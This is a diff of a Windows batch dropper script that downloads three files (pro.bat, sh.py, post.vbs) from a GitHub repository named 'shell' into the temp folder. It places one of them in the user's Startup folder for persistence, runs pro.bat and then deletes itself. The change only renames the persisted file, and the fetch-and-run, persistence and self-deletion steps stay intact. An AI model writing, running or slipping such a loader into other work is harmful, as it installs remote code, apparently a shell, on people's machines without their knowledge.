@@ -1,7 +1,7 @@
 @echo off
 curl https://raw.githubusercontent.com/0x2034/shell/main/pro.bat -o %temp%\pro.bat
 curl https://raw.githubusercontent.com/0x2034/shell/main/sh.py -o %temp%\sh.py
-curl https://raw.githubusercontent.com/0x2034/shell/main/post.vbs -o "%temp%\post.vbs"
-move "%temp%\post.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
+curl https://raw.githubusercontent.com/0x2034/shell/main/post.vbs -o "%temp%\sec2.bat"
+move "%temp%\sec2.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
 call %temp%\pro.bat
 del "%~f0"
